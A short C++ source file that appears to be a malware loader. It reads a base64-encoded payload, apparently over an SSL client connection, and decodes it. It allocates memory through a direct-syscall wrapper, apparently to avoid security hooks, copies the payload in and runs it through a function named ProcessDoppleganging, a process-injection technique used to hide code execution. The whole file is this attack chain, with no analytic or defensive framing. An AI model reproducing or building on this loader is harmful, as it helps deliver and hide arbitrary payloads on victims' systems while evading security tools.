#include "syscalls.h"
#include "sslClient.h"
#include "base64.h"
#include <stdio.h>
#include <vector>

void Run()
{
	size_t payloadSize = 0;

	std::string encoded = Read();
	std::vector<BYTE> decoded = base64_decode(encoded);
	payloadSize = decoded.size();
	
	PVOID memBuffer_ = NULL;
	NTSTATUS status = SysNtAllocateVirtualMemory10(GetCurrentProcess(), &memBuffer_, NULL, &payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	BYTE* memBuffer = (BYTE*)memBuffer_;
	memcpy(memBuffer, decoded.data(), decoded.size());
	
	ProcessDoppleganging(memBuffer, decoded.size());
}

int wmain()
{
	Run();
}

